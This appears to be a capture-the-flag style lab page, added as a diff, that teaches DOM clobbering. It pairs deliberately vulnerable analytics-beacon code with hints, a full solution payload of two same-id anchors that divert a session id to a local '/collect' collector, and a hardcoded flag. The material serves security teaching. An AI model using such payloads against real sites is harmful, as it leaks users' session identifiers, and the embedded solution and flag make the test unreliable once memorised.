@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lab 2 · Analytics beacon</title>
+<link rel="stylesheet" href="/css/lab.css">
+</head>
+<body>
+<header class="top">
+  <a href="/">← DOM Clobbering Lab</a>
+  <span class="badge">Lab 2 · easy</span>
+</header>
+
+<main>
+  <h1>Analytics beacon</h1>
+  <p class="lede">
+    On load the app derives an analytics endpoint from <code>window.analyticsConfig</code>
+    and appends a per-session secret id. It should only ever talk to
+    <code>/api/analytics/ping</code>. Make it send the session id to your collector
+    (<code>/collect</code>) instead.
+  </p>
+
+  <section class="card grid2">
+    <div>
+      <h2>Victim code</h2>
+<pre><code>const cfg = window.analyticsConfig
+          || { beacon: '/api/analytics/ping' };
+
+const url = cfg.beacon + '?sid=' + SID;
+
+new Image().src = url;</code></pre>
+      <p class="muted" style="margin:12px 0 0">
+        A single global can resolve to a single element, but multiple elements with the same
+        <code>id</code> produce an <code>HTMLCollection</code>. A collection supports
+        <em>named</em> access for children that have a <code>name</code> attribute.
+      </p>
+    </div>
+
+    <div>
+      <h2>Your HTML injection</h2>
+      <textarea id="payload" spellcheck="false" placeholder="&lt;p&gt;hello&lt;/p&gt;"></textarea>
+      <div class="row">
+        <button id="run">Render &amp; run app</button>
+        <button id="verify" class="ghost">Verify exploit</button>
+        <button id="reset" class="ghost">Reset page</button>
+      </div>
+
+      <details>
+        <summary>Hint 1 — shape</summary>
+        <p style="color:#b7c2d0;margin:8px 0 0">
+          You need <code>cfg.beacon</code> to become an attacker-controlled value. With two
+          elements sharing <code>id="analyticsConfig"</code>, <code>window.analyticsConfig</code>
+          is a collection — and the second element can expose <em>itself</em> as the
+          <code>beacon</code> property via <code>name="beacon"</code>.
+        </p>
+      </details>
+
+      <details>
+        <summary>Hint 2 — from element to string</summary>
+        <p style="color:#b7c2d0;margin:8px 0 0">
+          <code>cfg.beacon</code> will be an element, but string concatenation coerces it.
+          Which element's <code>String()</code> returns its <code>href</code>?
+        </p>
+      </details>
+
+      <details>
+        <summary>Solution</summary>
+<pre><code>&lt;a id="analyticsConfig"&gt;&lt;/a&gt;
+&lt;a id="analyticsConfig" name="beacon" href="/collect"&gt;&lt;/a&gt;</code></pre>
+        <p style="color:#b7c2d0;margin:8px 0 0">
+          <code>window.analyticsConfig</code> is an <code>HTMLCollection</code>;
+          <code>.beacon</code> returns the second anchor; string concatenation calls
+          <code>HTMLAnchorElement.prototype.toString</code>, which returns the absolute
+          <code>href</code>. The beacon becomes
+          <code>http://127.0.0.1:8000/collect?sid=…</code>.
+        </p>
+      </details>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2>Rendered injection <span class="muted">(#victim)</span></h2>
+    <div id="victim" class="victim"></div>
+  </section>
+
+  <section class="card">
+    <h2>App output / evidence</h2>
+    <div id="evidence" class="log"></div>
+    <p class="muted" style="margin:10px 0 0">
+      Check the <a href="/attacker.html" target="_blank" rel="noopener">attacker inbox</a> to see
+      the request arrive with the session id in the query string.
+    </p>
+  </section>
+
+  <div id="flag" class="flag hidden"></div>
+</main>
+
+<script src="/js/lab.js"></script>
+<script>
+(function () {
+  "use strict";
+
+  var KEY = "domlab.lab2.sid";
+  if (!sessionStorage.getItem(KEY)) {
+    sessionStorage.setItem(KEY, "sid_" + Math.random().toString(36).slice(2, 12));
+  }
+  var SID = sessionStorage.getItem(KEY);
+
+  var lastUrl = null;
+
+  function runVictim() {
+    Lab.startedAt = Date.now();
+    Lab.clearLog();
+
+    Lab.inject(document.getElementById("payload").value);
+
+    /* ==================== VICTIM CODE ==================== */
+    var cfg = window.analyticsConfig || { beacon: "/api/analytics/ping" };
+    Lab.log("window.analyticsConfig -> " + Lab.describe(window.analyticsConfig));
+    Lab.log("cfg.beacon -> " + Lab.describe(cfg.beacon));
+
+    var url = cfg.beacon + "?sid=" + encodeURIComponent(SID);
+    lastUrl = url;
+    Lab.log("beacon request: " + url);
+
+    var img = new Image();
+    img.onerror = function () { /* ignore */ };
+    img.src = url;
+    /* ===================================================== */
+  }
+
+  function verify() {
+    Lab.wait(400).then(function () {
+      return Lab.since(Lab.startedAt);
+    }).then(function (rows) {
+      var needle = "sid=" + encodeURIComponent(SID);
+      var hit = rows.filter(function (e) {
+        return e.path === "/collect" && String(e.query).indexOf(needle) !== -1;
+      });
+      if (hit.length) {
+        Lab.log("Exploit confirmed: collector received the session id.", "good");
+        Lab.solved("lab2", "FLAG{c0ll3ct10n_b34c0n}");
+      } else {
+        Lab.log("No hit at /collect yet. Last beacon was: " + lastUrl, "warn");
+      }
+    });
+  }
+
+  Lab.wire({ run: runVictim, verify: verify });
+
+  Lab.showExistingSolve("lab2");
+  runVictim();
+})();
+</script>
+</body>
+</html>
